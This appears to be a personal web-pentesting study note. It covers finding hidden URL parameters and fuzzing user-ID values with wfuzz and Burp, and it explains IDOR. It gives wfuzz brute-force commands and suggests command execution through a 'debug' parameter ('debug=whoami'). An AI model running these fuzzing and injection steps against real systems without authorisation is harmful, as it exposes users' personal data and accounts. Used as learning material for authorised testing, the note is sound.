**Discovering param name:**

If yo had a URL like this and you get asked to provide a userID:
`www.example.com/orders.php`

We know that it should look something like the following, but how do we find out what the param is?
`www.example.com/orders.php?id=`

So if we try `id=` and run a brute-force, but nothing comes up, we'll have to first get the param name.

In Burp:
`GET /orders.php  HTTP/1.1`

**Wfuzz:**

```php
wfuzz -w /usr/share/wordlist/-/burp-param-names "http://example.com/orders.php?FUZZ=FUZZ"
```

- Wordlist: burp param names
- FUZZ position: `FUZZ=FUZZ`
- Hide code/length/words/chars responses: `-hc`+`-hl`+`-hw`+`-hh`

**Extending the search:**

```php
wfuzz -w /usr/share/wordlist/-/burp-param-names.txt "http://example.com/orders.php?userID=test&FUZZ=FUZZ"
```

- You should still get the first result, but here you might now get another param.

```php
'http://example.com/orders.php?userID=test&debug=test'
```
- In this example we got back `debug` which is sometimes put in by developers as a backdoor. So here we could use this as RCE: `http://example.com/orders.php?userID=test&debug=whoami`

**Finding param values:**

```php
wfuzz -w /usr/share/wordlist/-/numbers.txt -hh 559 "http://example.com/orders.php?userID=FUZZ"
```
- So let's pretend we just got back the `userID` param, now we can fuzz the app by login into the app with a normal user account, and trying to find out what the app uses in that position, is it an integer for example?

**IDOR:**

Insecure Direct Object Reference is when you get access to sensitive personal data through fuzzing the id of the user, we then get an authorisation bypass. The app should have an authorisation check. 

You might be able to carry our a bank transaction for example with a userID.

**Send requests to Burp:**

```php
wfuzz -w /usr/share/wordlist/-/numbers.txt -hh 559 -p 127.0.0.1:8080:HTTP "http://example.com/orders.php?userID=FUZZ"
```
- Proxy: `-p 127.0.0.1:8080:HTTP`

_Using`FUZZ=FUZZ` adds two arguments._

**POST:**

```php
wfuzz -w /usr/share/wordlist/-/numbers.txt -hh 559 -X POST "http://example.com/orders.php?userID=FUZZ"
```

Post data in the body of the request:

```php
wfuzz -w /usr/share/wordlist/-/numbers.txt -hh 559 -X POST -d "username=FUZZ&password=test" "http://example.com/orders.php?userID=FUZZ"
```
- If you're unsure what this looks like, proxy the request through burp so you can view and modify the request as needed.

---

**Completed:** _18:11 2024-09-13_


